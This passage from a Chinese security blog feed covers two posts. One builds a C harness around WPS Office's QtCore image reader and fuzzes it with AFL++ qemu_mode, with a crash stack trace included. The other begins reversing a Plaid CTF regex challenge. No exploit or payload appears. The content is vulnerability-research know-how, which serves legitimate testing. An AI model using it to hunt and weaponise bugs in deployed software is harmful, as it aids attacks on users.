class="hljs-attribute">_DPH_HEAP_ROOT</span> @ <span class="hljs-number">6731000</span>    <span class="hljs-attribute">in</span> busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)                                <span class="hljs-attribute">cc36323c</span>:         cc<span class="hljs-number">53</span>afa<span class="hljs-number">8</span>               <span class="hljs-number">58</span> -         cc<span class="hljs-number">53</span>a<span class="hljs-number">000</span>             <span class="hljs-number">2000</span>    <span class="hljs-attribute">6f13ab70</span> verifier!AVrfDebugPageHeapAllocate+<span class="hljs-number">0</span>x<span class="hljs-number">00000240</span>    <span class="hljs-attribute">77a9909b</span> ntdll!RtlDebugAllocateHeap+<span class="hljs-number">0</span>x<span class="hljs-number">00000039</span>    <span class="hljs-attribute">779ebbad</span> ntdll!RtlpAllocateHeap+<span class="hljs-number">0</span>x<span class="hljs-number">000000</span>ed    <span class="hljs-attribute">779eb0cf</span> ntdll!RtlpAllocateHeapInternal+<span class="hljs-number">0</span>x<span class="hljs-number">0000022</span>f    <span class="hljs-attribute">779eae8e</span> ntdll!RtlAllocateHeap+<span class="hljs-number">0</span>x<span class="hljs-number">0000003</span>e    <span class="hljs-attribute">6f080269</span> MSVCR<span class="hljs-number">100</span>!malloc+<span class="hljs-number">0</span>x<span class="hljs-number">0000004</span>b    <span class="hljs-attribute">6f08233b</span> MSVCR<span class="hljs-number">100</span>!operator new+<span class="hljs-number">0</span>x<span class="hljs-number">0000001</span>f    <span class="hljs-attribute">6b726c67</span> QtCore<span class="hljs-number">4</span>!QImageData::create+<span class="hljs-number">0</span>x<span class="hljs-number">000000</span>fa    <span class="hljs-attribute">6b726b54</span> QtCore<span class="hljs-number">4</span>!QImage::QImage+<span class="hljs-number">0</span>x<span class="hljs-number">0000004</span>e    <span class="hljs-attribute">6b7a0e21</span> QtCore<span class="hljs-number">4</span>!png_get_text+<span class="hljs-number">0</span>x<span class="hljs-number">00000436</span>    <span class="hljs-attribute">6b79d7a8</span> QtCore<span class="hljs-number">4</span>!QImageIOHandler::setFormat+<span class="hljs-number">0</span>x<span class="hljs-number">000000</span>de    <span class="hljs-attribute">6b79d457</span> QtCore<span class="hljs-number">4</span>!QPixmapData::fromFile+<span class="hljs-number">0</span>x<span class="hljs-number">000002</span>bf    <span class="hljs-attribute">6b725eb4</span> QtCore<span class="hljs-number">4</span>!QImageReader::read+<span class="hljs-number">0</span>x<span class="hljs-number">000001</span>e<span class="hljs-number">2</span>    <span class="hljs-attribute">6d0ca585</span> kso!kpt::VariantImage::forceUpdateCacheImage+<span class="hljs-number">0</span>x<span class="hljs-number">0000254</span>e    <span class="hljs-attribute">6d0c5964</span> kso!kpt::Direct<span class="hljs-number">2</span>DPaintEngineHelper::operator=+<span class="hljs-number">0</span>x<span class="hljs-number">00000693</span>    <span class="hljs-attribute">6d0c70d0</span> kso!kpt::RelativeRect::unclipped+<span class="hljs-number">0</span>x<span class="hljs-number">00001146</span>    <span class="hljs-attribute">6d0c8d0c</span> kso!kpt::VariantImage::forceUpdateCacheImage+<span class="hljs-number">0</span>x<span class="hljs-number">00000</span>cd<span class="hljs-number">5</span>    <span class="hljs-attribute">6d451d5c</span> kso!BlipCacheMgr::BrushCache+<span class="hljs-number">0</span>x<span class="hljs-number">0000049</span>a    <span class="hljs-attribute">6d451e85</span> kso!BlipCacheMgr::GenerateBitmap+<span class="hljs-number">0</span>x<span class="hljs-number">0000001</span>d    <span class="hljs-attribute">6d453227</span> kso!BlipCacheMgr::GenCachedBitmap+<span class="hljs-number">0</span>x<span class="hljs-number">00000083</span>    <span class="hljs-attribute">6d29bb92</span> kso!drawing::PictureRenderLayer::render+<span class="hljs-number">0</span>x<span class="hljs-number">000009</span>b<span class="hljs-number">6</span>    <span class="hljs-attribute">6d450fb1</span> kso!drawing::RenderTargetImpl::paint+<span class="hljs-number">0</span>x<span class="hljs-number">00000090</span>    <span class="hljs-attribute">6d29b528</span> kso!drawing::PictureRenderLayer::render+<span class="hljs-number">0</span>x<span class="hljs-number">0000034</span>c    <span class="hljs-attribute">6d2a2d83</span> kso!drawing::VisualRenderer::render+<span class="hljs-number">0</span>x<span class="hljs-number">00000060</span>    <span class="hljs-attribute">6d2b8970</span> kso!drawing::SingleVisualRenderer::drawNormal+<span class="hljs-number">0</span>x<span class="hljs-number">000002</span>b<span class="hljs-number">5</span>    <span class="hljs-attribute">6d2b86a7</span> kso!drawing::SingleVisualRenderer::draw+<span class="hljs-number">0</span>x<span class="hljs-number">000001</span>e<span class="hljs-number">1</span>    <span class="hljs-attribute">6d2b945e</span> kso!drawing::SingleVisualRenderer::draw+<span class="hljs-number">0</span>x<span class="hljs-number">00000046</span>    <span class="hljs-attribute">6d3d0142</span> kso!drawing::ShapeVisual::paintEvent+<span class="hljs-number">0</span>x<span class="hljs-number">0000044</span>a    <span class="hljs-attribute">680a2b5c</span> wpsmain!WpsShapeTreeVisual::getHittestSubVisuals+<span class="hljs-number">0</span>x<span class="hljs-number">000068</span>f<span class="hljs-number">1</span>    <span class="hljs-attribute">6d0e36df</span> kso!AbstractVisual::visualEvent+<span class="hljs-number">0</span>x<span class="hljs-number">00000051</span>    <span class="hljs-attribute">6d3cbe97</span> kso!drawing::ShapeVisual::visualEvent+<span class="hljs-number">0</span>x<span class="hljs-number">0000018</span>f    <span class="hljs-attribute">6d0eba90</span> kso!VisualPaintEvent::arriveVisual+<span class="hljs-number">0</span>x<span class="hljs-number">0000004</span>e</code></pre><p>后续两篇文章<code>fuzz</code>的代码逻辑为</p><pre><code class="hljs maxima">QImage <span class="hljs-built_in">image</span>;QImageReader reader;QString image_file_name;# <span class="hljs-built_in">transform</span> (char[] <span class="hljs-built_in">file_name</span>) to (QString image_file_name)reader.setFileName(image_file_name)reader.<span class="hljs-built_in">read</span>(<span class="hljs-built_in">image</span>);</code></pre><h2 id="从windows到linux"><a href="#从windows到linux" class="headerlink" title="从windows到linux"></a>从windows到linux</h2><p>在迁移的时候，就去找了一下对应的<code>libQtCore.so.4.7.4</code>的接口，得到了以下的代码</p><pre><code class="hljs c"><span class="hljs-comment">// gcc -g -masm=intel ./qt_reader.c -ldl -no-pie -o qt_reader</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;dlfcn.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><span class="hljs-function"></span>&#123;    dlopen(<span class="hljs-string">&quot;/path/libc++.so.1&quot;</span>, RTLD_LAZY);    dlopen(<span class="hljs-string">&quot;/path/libpng12.so.0&quot;</span>, RTLD_LAZY);    dlopen(<span class="hljs-string">&quot;/path/libc++abi.so.1&quot;</span>, RTLD_LAZY);    <span class="hljs-keyword">void</span>* handle = dlopen(<span class="hljs-string">&quot;/path/libQtCore.so.4.7.4&quot;</span>, RTLD_LAZY);    <span class="hljs-keyword">if</span> (handle == <span class="hljs-number">0</span>)    &#123;        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;open handle failed&quot;</span>);        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, dlerror());        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);    &#125;        <span class="hljs-comment">// QImageReader::QImageReader(QImageReader *this)</span>    <span class="hljs-keyword">void</span> (*qt_qimageReader)() = dlsym(handle, <span class="hljs-string">&quot;_ZN12QImageReaderC2Ev&quot;</span>);    <span class="hljs-comment">// QImageReader::read(QImageReader *this, QImage *a2)</span>    <span class="hljs-keyword">void</span> (*qt_qimageReader_read)() = dlsym(handle, <span class="hljs-string">&quot;_ZN12QImageReader4readEP6QImage&quot;</span>);    <span class="hljs-comment">// QImageReader::setFileName(QImageReader *this, const QString *a2)</span>    <span class="hljs-keyword">void</span> (*qt_setFileName)() = dlsym(handle, <span class="hljs-string">&quot;_ZN12QImageReader11setFileNameERK7QString&quot;</span>);    <span class="hljs-comment">// QString::QString(QString *this, const QChar *)</span>    <span class="hljs-keyword">void</span> (*qt_qstring)() = dlsym(handle, <span class="hljs-string">&quot;_ZN7QStringC2EPK5QChar&quot;</span>);    <span class="hljs-comment">// QString::fromLatin1(QString *this, const char *, unsigned int)</span>    <span class="hljs-keyword">void</span> (*qt_qstring_fromlatin1)() = dlsym(handle, <span class="hljs-string">&quot;_ZN7QString10fromLatin1EPKci&quot;</span>);    <span class="hljs-comment">// QImage::QImage(QImage *this)</span>    <span class="hljs-keyword">void</span> (*qt_qimage)() = dlsym(handle, <span class="hljs-string">&quot;_ZN6QImageC2Ev&quot;</span>);    <span class="hljs-comment">// QFile::exists(QFile *__hidden this)</span>    <span class="hljs-keyword">void</span> (*qt_qfile_exits)() = dlsym(handle, <span class="hljs-string">&quot;_ZNK5QFile6existsEv&quot;</span>);    <span class="hljs-comment">// QFile::close()</span>    <span class="hljs-keyword">void</span> (*qt_close)() = dlsym(handle, <span class="hljs-string">&quot;_ZN5QFile5closeEv&quot;</span>);    <span class="hljs-keyword">char</span>* image = (<span class="hljs-keyword">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span>);<span class="hljs-keyword">char</span>* qstring = (<span class="hljs-keyword">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span>);<span class="hljs-keyword">char</span>* reader = (<span class="hljs-keyword">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span>);    <span class="hljs-keyword">char</span>* file_name = argv[<span class="hljs-number">1</span>];    <span class="hljs-comment">// pusha</span>    __asm__ __volatile__(        <span class="hljs-string">&quot;push rax\n&quot;</span>        <span class="hljs-string">&quot;push rbx\n&quot;</span>        <span class="hljs-string">&quot;push rcx\n&quot;</span>          <span class="hljs-string">&quot;push rdx\n&quot;</span>              <span class="hljs-string">&quot;push rbp\n&quot;</span>              <span class="hljs-string">&quot;push rdi\n&quot;</span>              <span class="hljs-string">&quot;push rsi\n&quot;</span>              <span class="hljs-string">&quot;push r8\n&quot;</span>              <span class="hljs-string">&quot;push r9\n&quot;</span>              <span class="hljs-string">&quot;push r10\n&quot;</span>              <span class="hljs-string">&quot;push r11\n&quot;</span>              <span class="hljs-string">&quot;push r12\n&quot;</span>              <span class="hljs-string">&quot;push r13\n&quot;</span>              <span class="hljs-string">&quot;push r14\n&quot;</span>              <span class="hljs-string">&quot;push r15\n&quot;</span>        <span class="hljs-string">&quot;push r15\n&quot;</span>);    <span class="hljs-comment">// QImage::QImage(image)</span>    __asm__ __volatile__ (        <span class="hljs-string">&quot;call rax\n&quot;</span>        :        : <span class="hljs-string">&quot;D&quot;</span>(image), <span class="hljs-string">&quot;a&quot;</span>(qt_qimage)    );        <span class="hljs-comment">// QImageReader::QImageReader(reader)</span>    __asm__ __volatile__ (        <span class="hljs-string">&quot;call rax\n&quot;</span>        :        : <span class="hljs-string">&quot;D&quot;</span>(reader), <span class="hljs-string">&quot;a&quot;</span>(qt_qimageReader)    );    <span class="hljs-comment">// **************** This is a wrong interface of transforming the char to QString ***********************</span>    <span class="hljs-comment">// // QString::QString(qstring, file_name)</span>    <span class="hljs-comment">// __asm__ __volatile__ (</span>    <span class="hljs-comment">//     &quot;call rax\n&quot;</span>    <span class="hljs-comment">//     :</span>    <span class="hljs-comment">//     : &quot;D&quot;(qstring), &quot;S&quot;(file_name), &quot;a&quot;(qt_qstring)</span>    <span class="hljs-comment">// );</span>    <span class="hljs-comment">// QString::fromLatin1(QString *this, const char *, unsigned int)</span>    __asm__ __volatile__ (        <span class="hljs-string">&quot;call rax\n&quot;</span>        :        : <span class="hljs-string">&quot;D&quot;</span>(qstring), <span class="hljs-string">&quot;S&quot;</span>(file_name), <span class="hljs-string">&quot;d&quot;</span>(<span class="hljs-built_in">strlen</span>(file_name)), <span class="hljs-string">&quot;a&quot;</span>(qt_qstring_fromlatin1)    );    <span class="hljs-comment">// QImageReader::setFileName(reader, qstring)</span>    __asm__ __volatile__ (        <span class="hljs-string">&quot;call rax\n&quot;</span>        :        : <span class="hljs-string">&quot;D&quot;</span>(reader), <span class="hljs-string">&quot;S&quot;</span>(qstring), <span class="hljs-string">&quot;a&quot;</span>(qt_setFileName)    );    <span class="hljs-comment">// QFile::exits(qfile) qfile = reader+0x10</span>    __asm__ __volatile__ (        <span class="hljs-string">&quot;mov rsi, [rdi]\n&quot;</span>        <span class="hljs-string">&quot;mov rdi, [rsi+0x10]\n&quot;</span>        <span class="hljs-string">&quot;call rax\n&quot;</span>        <span class="hljs-string">&quot;test al, al\n&quot;</span>        <span class="hljs-string">&quot;je error\n&quot;</span>        :        : <span class="hljs-string">&quot;D&quot;</span>(reader), <span class="hljs-string">&quot;a&quot;</span>(qt_qfile_exits)    );    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;file exists&quot;</span>);    <span class="hljs-comment">// QImageReader::read(reader, qimage)</span>    __asm__ __volatile__ (        <span class="hljs-string">&quot;call rax\n&quot;</span>        :        : <span class="hljs-string">&quot;D&quot;</span>(reader), <span class="hljs-string">&quot;S&quot;</span>(image), <span class="hljs-string">&quot;a&quot;</span>(qt_qimageReader_read)    );        <span class="hljs-comment">// QFile::close()</span>    __asm__ __volatile__ (        <span class="hljs-string">&quot;mov rsi, [rdi]\n&quot;</span>        <span class="hljs-string">&quot;mov rdi, [rsi+0x10]\n&quot;</span>        <span class="hljs-string">&quot;call rax\n&quot;</span>        <span class="hljs-string">&quot;jmp out\n&quot;</span>        :        : <span class="hljs-string">&quot;D&quot;</span>(reader), <span class="hljs-string">&quot;a&quot;</span>(qt_close)    );    <span class="hljs-comment">// error:</span>    __asm__ __volatile__ (        <span class="hljs-string">&quot;error:\n&quot;</span>    );    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;error: file not exists&quot;</span>);    <span class="hljs-comment">// popa</span>    __asm__ __volatile__(        <span class="hljs-string">&quot;out:\n&quot;</span>        <span class="hljs-string">&quot;pop r15\n&quot;</span>        <span class="hljs-string">&quot;pop r15\n&quot;</span>        <span class="hljs-string">&quot;pop r14\n&quot;</span>        <span class="hljs-string">&quot;pop r13\n&quot;</span>        <span class="hljs-string">&quot;pop r12\n&quot;</span>        <span class="hljs-string">&quot;pop r11\n&quot;</span>        <span class="hljs-string">&quot;pop r10\n&quot;</span>        <span class="hljs-string">&quot;pop r9\n&quot;</span>        <span class="hljs-string">&quot;pop r8\n&quot;</span>        <span class="hljs-string">&quot;pop rsi\n&quot;</span>        <span class="hljs-string">&quot;pop rdi\n&quot;</span>        <span class="hljs-string">&quot;pop rbp\n&quot;</span>        <span class="hljs-string">&quot;pop rdx\n&quot;</span>        <span class="hljs-string">&quot;pop rcx\n&quot;</span>        <span class="hljs-string">&quot;pop rbx\n&quot;</span>        <span class="hljs-string">&quot;pop rax\n&quot;</span>        );    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Done&quot;</span>);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>这个地方，最开始写的时候，撸了一版跟后两篇一样的接口的代码，但是发现覆盖率并没有上升，最后调的时候，发现在<code>reader.read()</code>的第一次判断支持的文件格式（<code>bmp, png, jpg ...</code>）以及文件是否存在时，就发现程序自身就走到了<code>File Not found</code>的地方</p><p>无奈只能重新调试程序，最后找到了一个<code>QFile::exists()</code>接口，调试的时候，发现<code>QFile</code>中存储的路径的<code>QString</code>跟我用<code>QString::QString()</code>的数据结构并不一致，就换了一个<code>QString::fromLatin1()</code>接口，就能成功地跑起来了</p><h2 id="fuzz"><a href="#fuzz" class="headerlink" title="fuzz"></a>fuzz</h2><p>在写好板子之后就想要用<code>afl</code>的<code>qemu_mode</code>进行插桩<code>fuzz</code>，折腾了半天，感觉<code>afl</code>原本的<code>qemu</code>版本以及<code>patch</code>和<code>libc</code>的接口都太老了</p><p>最后听学长的直接整<code>afl++</code>的<code>qemu_mode</code></p><p>最初<code>fuzz</code>起来的时候，并没过多的设置，但是这样的话是全插桩，像<code>dlopen</code>的一些库都是不关心以及没必要的，而且在<code>afl++</code>的窗口也看的出来，基本上覆盖率都是不上升的，而且极低（0.10%）</p><p>利用<code>./afl-qemu-trace -D 1.txt -d exec,nochain ./qt_reader /tmp/1.png</code>记录下来<code>trace</code>，发现不同文件的<code>trace</code>差距还是很明显的，说明代码并没有写崩</p><p>最后利用<code>export AFL_INST_LIBS=1</code>给库函数也插桩之后就可以跑起来了</p><p>另外也可以通过<code>AFL_QEMU_INST_RANGES</code>设置<code>range</code>，进行范围的插桩，通过以下代码获取相关<code>.so</code>的内存地址范围</p><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> *<span class="hljs-title">lm</span> = (<span class="hljs-title">struct</span> <span class="hljs-title">link_map</span>*)<span class="hljs-title">handle</span>;</span><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;base:%p\n&quot;</span>, lm-&gt;l_addr);</code></pre><p>另外翻了一下<code>afl</code>的源码，可以看到如果<code>cur_loc &gt;= afl_inst_rms</code>则<code>return</code>，所以如果给库插桩还是要注意是否超过了<code>MAP_SIZE</code>，否则最后的比较关心的<code>.so</code>没插桩上</p><pre><code class="hljs c"><span class="hljs-comment">/* Instrumentation ratio: */</span><span class="hljs-keyword">static</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> afl_inst_rms = MAP_SIZE;<span class="hljs-comment">/* The equivalent of the tuple logging routine from afl-as.h. */</span><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-keyword">void</span> <span class="hljs-title">afl_maybe_log</span><span class="hljs-params">(abi_ulong cur_loc)</span> </span>&#123;  <span class="hljs-keyword">static</span> __thread abi_ulong prev_loc;  <span class="hljs-comment">/* Optimize for cur_loc &gt; afl_end_code, which is the most likely case on</span><span class="hljs-comment">     Linux systems. */</span>  <span class="hljs-keyword">if</span> (cur_loc &gt; afl_end_code || cur_loc &lt; afl_start_code || !afl_area_ptr)    <span class="hljs-keyword">return</span>;  <span class="hljs-comment">/* Looks like QEMU always maps to fixed locations, so ASAN is not a</span><span class="hljs-comment">     concern. Phew. But instruction addresses may be aligned. Let&#x27;s mangle</span><span class="hljs-comment">     the value to get something quasi-uniform. */</span>  cur_loc  = (cur_loc &gt;&gt; <span class="hljs-number">4</span>) ^ (cur_loc &lt;&lt; <span class="hljs-number">8</span>);  cur_loc &amp;= MAP_SIZE - <span class="hljs-number">1</span>;  <span class="hljs-comment">/* Implement probabilistic instrumentation by looking at scrambled block</span><span class="hljs-comment">     address. This keeps the instrumented locations stable across runs. */</span>  <span class="hljs-keyword">if</span> (cur_loc &gt;= afl_inst_rms) <span class="hljs-keyword">return</span>;  afl_area_ptr[cur_loc ^ prev_loc]++;  prev_loc = cur_loc &gt;&gt; <span class="hljs-number">1</span>;&#125;</code></pre><h2 id="其他-踩坑"><a href="#其他-踩坑" class="headerlink" title="其他 踩坑"></a>其他 <del>踩坑</del></h2><h3 id="reader-setFileName"><a href="#reader-setFileName" class="headerlink" title="reader.setFileName"></a>reader.setFileName</h3><p>一开始我想去找<code>houjingyi</code>师傅是如何得到<code>reader.setFileName</code>接口在<code>reader.read()</code>之前被调用了的，因此我去尝试调试<code>linux</code>下的<code>wpsoffice</code>打开<code>docx</code>的操作</p><p>在<code>wpsoffice</code>最初并未加载<code>libQtCore.so.4.7.4</code>时，给<code>pthread_create</code>下断点，<code>continue</code>之后再给<code>libQtCore.so.4.7.4</code>中的<code>QImageReader.read()</code>和<code>QImageReader.setFileName()</code>下断点，但是其实最后并没有很明显的看出来，在调用<code>reader.read()</code>之前调用了<code>reader.setFileName()</code></p><p>最后去询问<code>houjingyi</code>师傅，才知道，师傅是直接根据程序代码逻辑，认为<code>reader.read()</code>之前肯定有对于设置图片路径<code>reader.setFileName()</code>的操作（感觉自己的思维有点局限了，老是想明明白白调出来调用的接口和顺序，实际上全然没管开发者在开发时候的代码逻辑）</p><p>P.S. 说起来，调试 <code>wpsoffice</code> 的程序的时候，觉得特别神奇，<code>wpsoffice</code>会运行<strong>两次</strong><code>_start</code>，在第一次<code>_start</code>的时候，可以看到<code>wpsoffice</code>在加载自己的程序的窗口，在第一次<code>_start</code>的最后会<code>jmp</code>第二次的<code>_start</code>，第二次的<code>wps</code>窗口，显示正在加载<code>docx</code>文件，因此当时我调试的时候，猜测第一次<code>_start</code>的时候，是在利用<code>QtCore</code>加载自己窗口，而第二次才是渲染解析<code>docx</code>文件，但是最后还是没调出来</p><h3 id="QString-QString"><a href="#QString-QString" class="headerlink" title="QString::QString"></a>QString::QString</h3><p>这个接口转换出来的并不是<code>QString</code>坑了我一段时间，最后找到<code>QFile::exists()</code>接口的时候，才发现，<code>QString::QString</code>转换出来的不是<code>QString</code></p><h3 id="AFL-INST-LIBS-AFL-QEMU-INST-RANGES"><a href="#AFL-INST-LIBS-AFL-QEMU-INST-RANGES" class="headerlink" title="AFL_INST_LIBS AFL_QEMU_INST_RANGES"></a>AFL_INST_LIBS AFL_QEMU_INST_RANGES</h3><p>不设置这两个的话，是不会给<code>dlopen</code>打开的库函数插桩的</p><h3 id="fuzz-断掉继续跑"><a href="#fuzz-断掉继续跑" class="headerlink" title="fuzz 断掉继续跑"></a>fuzz 断掉继续跑</h3><p>设置输入参数为<code>-i-</code> ，就可以读入 <code>fuzz_out/default/_resume</code>中的内容，继续跑</p><h3 id="其他问题"><a href="#其他问题" class="headerlink" title="其他问题"></a>其他问题</h3><p>顺手试了一波<code>Qt5.12.9</code>，最后跑的时候，是出现了<code>WARNING: Instrumentation output varies across runs.</code>，发现是出现了<code>ASLR</code>的情况，照理来说<code>qemu</code>应该不会出现这种情况，但是怎么解决，不太清楚</p><h4 id="qasan"><a href="#qasan" class="headerlink" title="qasan"></a>qasan</h4><p><del>另外试了一下<code>qasan</code>也无法进行插桩检测，感觉还得再整整</del></p><p><code>qasan</code>重新试了一下，没啥问题，至少也能跑起来，就是没啥效果，<code>build.py</code>之后，<code>./qasan ./elffile arg...</code>就可以了</p><h4 id="e9afl"><a href="#e9afl" class="headerlink" title="e9afl"></a>e9afl</h4><p>试了一下<code>e9afl</code>，但是觉得对于这种写的<code>harness</code>并不怎么友好，最终效果非常不好，对于库函数的插桩，应该是插桩所有函数，或者沿着接口的<code>CFG</code>需要对主要部分插桩，但是我反汇编，看的时候，感觉基本没插桩什么</p>]]></content>
    
    
    <categories>
      
      <category>Fuzz</category>
      
    </categories>
    
    
    <tags>
      
      <tag>afl++</tag>
      
      <tag>qemu_mode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Plaid CTF dr</title>
    <link href="/2021/05/10/Plaid%20CTF%20dr/"/>
    <url>/2021/05/10/Plaid%20CTF%20dr/</url>
    
    <content type="html"><![CDATA[<p>打比赛的时候，后面一直在看<code>dr</code>这个题，把大概逻辑逆清楚（<del>后来发现逆向一点用都没，感觉还不如猜呢，tcl，rust逆的很慢</del>），一开始觉得有点类似自动机，后面发现是正则之后，巨神两个小时就秒了（tql</p><p>拖了很久才来复现，稍微记录一下，免得之后忘记了</p><h2 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h2><p> 虽然是 rust 写的，但是程序逻辑比较简单，可以分为三部分，前面第一部分和第三部分都是定死的字符串 “3” 和 “yes”</p><p>第二部分输入的时候会出现一些奇怪的东西，到后面可以发现第二部分算是第四部分的提示</p><p>第二部分输入的是症状，第四部分是输入key，输入症状时，会出现类似自动机吃字符然后出现状态转换的提示，在这部分可以猜到一些最基本的符号表示，同时不同的症状需要的治病的费用不同，对后续的第四部分也会造成影响</p><p>第四部分输入key之后，会进行接受，并在最后将输入的内容和写在bss段的字符列表进行处理之后得到flag</p><h2 id="正则分析"><a href="#正则分析" class="headerlink" title="正则分析"></a>正则分析</h2><p>通过猜名字和对于不同的输入和提示的返回可以得到以下的分析结果</p><pre><code class="hljs"><span class="hljs-attribute">And</span>: 满足Res中所有的要求<span class="hljs-attribute">Alt</span>: 满足Res中其中一个要求<span class="hljs-attribute">Seq</span>: 正则需要满足的序列<span class="hljs-attribute">Lit</span>: 一个一个匹配，字面量<span class="hljs-attribute">Res</span>: 数组<span class="hljs-attribute">Star</span>: 匹配0个或者多个<span class="hljs-attribute">Eps</span>: epsilon<span class="hljs-attribute">Neg(Null)</span>: 匹配任意长度的<span class="hljs-attribute">Neg:</span>    10c -&gt; 10ca    Neg( ... Alt(Res([Lit(&quot;af&quot;)])) ...) -&gt; Neg( ... Alt(Res([Lit(&quot;f&quot;)])) ... )    应该是禁止出现 af 的意思        尝试 10caf 也失效了<span class="hljs-attribute">Consider</span>:     1: 1,7777,73331         0*16+1    10: 16,7777,73331       (0*16+1)*16+0        100: 256,7777,73331     ((0*16+1)*16+0)*16+0    10c: 268,7777,73331     ((0*16+1)*16+0)*16+0xc    %733331    相当于 Consider(Res([])) 的个数进制<span class="hljs-attribute">Moon</span>:     1: Moon([0-9],2,3), Moon([a-f],2,3), Moon( (([0-9],1,3), ([a-f],2,3)), 1, 2)    10: Moon([0-9],3,3), Moon([a-f],2,3), Moon( (([0-9],1,3), ([a-f],2,3)), 1, 2)    100: Moon([0-9],1,3), Moon([a-f],2,3), Moon( (([0-9],1,3), ([a-f],2,3)), 1, 2)    10c: Moon([a-f],3,3), Moon( (([0-9],1,3), ([a-f],2,3)), 1, 2)        相当于在算个数，如果个数相等了，这个 Moon 可以结束进入下一个    100c 这个c就吃不进去，因为第一项是 Moon([0-9], 1, 3)<span class="hljs-attribute">Fan:</span>    10: Neg(.. Fan([a-f], 6) ..)    10b: Neg(.. Fan([a-f], 5) ..)    倒数计数</code></pre><h2 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h2><p>最后对照输入<code>1</code>之后的正则提示，可以分析得到以下的结果</p><pre><code class="hljs lsl"><span class="hljs-number">1.</span> Neg(Null) + Consider( [bcd], Lit(<span class="hljs-string">&quot;cdb&quot;</span>)+Neg(bd) ], <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>)  字符串 []cdb 或者 cdb[] 且不能为 cdbb cdbd<span class="hljs-number">2.</span> *[<span class="hljs-number">1</span><span class="hljs-number">-3</span>] + (*[<span class="hljs-number">3</span><span class="hljs-number">-7</span>] + Neg(Null))                                <span class="hljs-number">3.</span> Consider( [<span class="hljs-number">05</span>a], [<span class="hljs-number">16</span>b], [<span class="hljs-number">27</span>cf], [<span class="hljs-number">38</span>dx], [<span class="hljs-number">49</span>e], <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span> )     算法需要 最后 %<span class="hljs-number">7</span> == <span class="hljs-number">0</span><span class="hljs-number">4.</span> Moon([<span class="hljs-number">0</span><span class="hljs-number">-9</span>], <span class="hljs-number">1</span>, <span class="hljs-number">3</span>) + Moon([a-f], <span class="hljs-number">2</span>, <span class="hljs-number">3</span>) + Moon( Moon([<span class="hljs-number">0</span><span class="hljs-number">-9</span>], <span class="hljs-number">1</span>, <span class="hljs-number">3</span>), Moon([a-f], <span class="hljs-number">2</span>, <span class="hljs-number">3</span>), <span class="hljs-number">1</span>, <span class="hljs-number">2</span>)    需要 数字(<span class="hljs-number">2</span> <span class="hljs-number">5</span> <span class="hljs-number">8.</span>..)+字符(<span class="hljs-number">1</span> <span class="hljs-number">4</span> <span class="hljs-number">7.</span>..)+数字(<span class="hljs-number">2</span> <span class="hljs-number">5</span> <span class="hljs-number">8.</span>..)+字符(<span class="hljs-number">1</span> <span class="hljs-number">4</span> <span class="hljs-number">7.</span>..) <span class="hljs-number">5.</span> Moon(Lit(<span class="hljs-string">&quot;10&quot;</span>), <span class="hljs-number">0</span>, <span class="hljs-number">3</span>)                                        <span class="hljs-number">10</span>需要出现<span class="hljs-number">3</span>次<span class="hljs-number">6.</span> Neg( Alt( Lit(<span class="hljs-string">&quot;af&quot;</span>), Lit(<span class="hljs-string">&quot;73&quot;</span>), 数字+Lit(<span class="hljs-string">&quot;a&quot;</span>), Lit(<span class="hljs-string">&quot;ccc&quot;</span>), Fan([<span class="hljs-number">0</span><span class="hljs-number">-9</span>], <span class="hljs-number">7</span>) )  )          af <span class="hljs-number">73</span> 数字+a ccc 都不能出现 数字也不能连续超过<span class="hljs-number">7</span>个   Neg( Alt( Lit(<span class="hljs-string">&quot;a&quot;</span>), Fan([<span class="hljs-number">0</span><span class="hljs-number">-9</span>], <span class="hljs-number">6</span>)))                   a 不能出现 数字不能连续超过<span class="hljs-number">6</span>个<span class="hljs-number">7.</span> Neg( Neg(Null) + Fan([a-f]+Neg(Null), <span class="hljs-number">6</span>))                                    字母不能超过<span class="hljs-number">6</span>个<span class="hljs-number">8.</span> Consider(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,a,b,c,d,e,f, <span class="hljs-number">0</span>,<span class="hljs-number">7777</span>,<span class="hljs-number">73331</span>)</code></pre><h2 id="大致推测"><a 